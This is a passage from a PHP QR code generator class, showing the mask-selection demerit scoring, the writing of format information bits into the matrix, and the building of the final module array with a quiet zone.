				$ver_shift2_0=str_repeat(chr(0),$this->size).$ver;
				$ver_or=chunk_split(~($ver_shift1 | $ver_shift2),$this->size,chr(170));
				$ver_and=chunk_split(~($ver_shift1_0 & $ver_shift2_0),$this->size,chr(170));

				$hor=chunk_split(~$hor,$this->size,chr(170));
				$ver=chunk_split(~$ver,$this->size,chr(170));
				$hor=$hor.chr(170).$ver;

				$n1_search="/".str_repeat(chr(255),5)."+|".str_repeat(chr($bit_r),5)."+/";
				$n3_search=chr($bit_r).chr(255).chr($bit_r).chr($bit_r).chr($bit_r).chr(255).chr($bit_r);
	
				$demerit_n3=substr_count($hor,$n3_search)*40;
				$demerit_n4=floor(abs(( (100* (substr_count($ver,chr($bit_r))/($this->byte_num)) )-50)/5))*10;

				$n2_search1="/".chr($bit_r).chr($bit_r)."+/";
				$n2_search2="/".chr(255).chr(255)."+/";
				$demerit_n2=0;
				preg_match_all($n2_search1,$ver_and,$ptn_temp);
				foreach($ptn_temp[0] as $str_temp)
				{
					$demerit_n2+=(strlen($str_temp)-1);
				}
				$ptn_temp=array();
				preg_match_all($n2_search2,$ver_or,$ptn_temp);
				foreach($ptn_temp[0] as $str_temp)
				{
					$demerit_n2+=(strlen($str_temp)-1);
				}
				$demerit_n2*=3;
				
				$ptn_temp=array();
				
				preg_match_all($n1_search,$hor,$ptn_temp);
				foreach($ptn_temp[0] as $str_temp)
				{
					$demerit_n1+=(strlen($str_temp)-2);
				}	
				$demerit_score=$demerit_n1+$demerit_n2+$demerit_n3+$demerit_n4;
	
				if ($demerit_score<=$min_demerit_score || $i==0)
				{
					$mask_number=$i;
					$min_demerit_score=$demerit_score;
				}
	
				$i++;
			}

			$mask_content=1 << $mask_number;
			
			$format_information_value=(($this->ec << 3) | $mask_number);
			$format_information_array=array("101010000010010","101000100100101",
			"101111001111100","101101101001011","100010111111001","100000011001110",
			"100111110010111","100101010100000","111011111000100","111001011110011",
			"111110110101010","111100010011101","110011000101111","110001100011000",
			"110110001000001","110100101110110","001011010001001","001001110111110",
			"001110011100111","001100111010000","000011101100010","000001001010101",
			"000110100001100","000100000111011","011010101011111","011000001101000",
			"011111100110001","011101000000110","010010010110100","010000110000011",
			"010111011011010","010101111101101");

			for($i=0; $i<15; $i++)
			{
				$content=substr($format_information_array[$format_information_value],$i,1);
				
				$this->matrix[$this->format_information_x1[$i]][$this->format_information_y1[$i]]=$content * 255;
				$this->matrix[$this->format_information_x2[$i+1]][$this->format_information_y2[$i+1]]=$content * 255;
			}
		
			$this->final = unpack("C*", file_get_contents(dirname(__FILE__).'/data/modele'.$this->version.'.dat'));
			$this->qr_size = $this->size+8;
			
			for($x=0; $x<$this->size; $x++)
			{
				for($y=0; $y<$this->size; $y++)
				{
					if ($this->matrix[$x][$y] & $mask_content)
						$this->final[($x+4) + ($y+4)*$this->qr_size+1] = true; 
				}
			}
		}
	}
}

?>